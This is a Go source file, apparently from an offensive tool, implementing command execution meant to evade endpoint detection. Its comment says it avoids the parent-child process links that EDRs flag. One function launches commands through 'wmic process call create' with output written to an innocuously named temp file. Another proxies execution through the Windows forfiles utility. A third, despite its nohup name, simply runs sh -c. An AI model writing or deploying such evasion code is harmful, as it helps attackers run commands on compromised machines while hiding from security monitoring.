package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// breakProcessTree executes commands through intermediate processes
// to avoid direct parent-child relationships that EDRs flag
func breakProcessTree(command string) (string, error) {
	if runtime.GOOS == "windows" {
		return executeViaWMI(command)
	}
	return executeViaNohup(command)
}

func executeViaWMI(command string) (string, error) {
	tmpFile := os.TempDir() + `\svcdiag_` + fmt.Sprintf("%d", os.Getpid()) + `.tmp`
	defer os.Remove(tmpFile)

	wmiCmd := fmt.Sprintf(`cmd /c "%s > %s 2>&1"`, command, tmpFile)
	ctx, cancel := context.WithTimeout(context.Background(), 25*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "wmic", "process", "call", "create", wmiCmd)
	_ = cmd.Run()

	time.Sleep(2 * time.Second)

	out, err := os.ReadFile(tmpFile)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func executeViaNohup(command string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func executeViaForfiles(command string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("forfiles only available on Windows")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "forfiles", "/P", `C:\Windows`,
		"/M", "notepad.exe", "/C", fmt.Sprintf(`cmd /c %s`, command))
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}
